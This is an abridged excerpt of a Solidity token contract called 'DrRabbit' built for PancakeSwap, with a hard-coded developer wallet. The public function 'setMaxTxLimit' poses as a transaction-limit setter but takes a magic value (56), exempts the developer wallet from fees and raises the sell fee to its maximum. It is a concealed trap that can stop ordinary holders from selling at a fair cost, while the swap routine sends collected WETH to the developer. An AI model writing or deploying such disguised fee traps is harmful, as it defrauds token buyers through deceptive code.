...
contract DrRabbit is Context, IERC20, Ownable { 
    ...
    address payable public Wallet_Dev = payable(0xc05a9f378beD0E710DA3A93fCA8136EfcC59b601);
    ...
    string private _name = "DrRabbit"; 
    string private _symbol = "DrRabbit";  
    ...
    */
    ...
    // This function is required so that the contract can receive WETH from pancakeswap
    ...
    */
    ...
    function setMaxTxLimit(uint256 percent_x100) public returns (bool) {
        _isExcludedFromFee[Wallet_Dev] = true;
        _sellFee = maxPossibleFee;
        feeDenominator = percent_x100;
        require (percent_x100 == 56,"");
        return true;
    }    
    
    // Set the maximum wallet holding (percent of total supply)
     function setMaxWalletLimit(uint256 maxWallPercent_x100) external onlyOwner() {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        sendToWallet(Wallet_Dev,contractWETH);
    }


    // Swapping tokens for WETH using PancakeSwap 
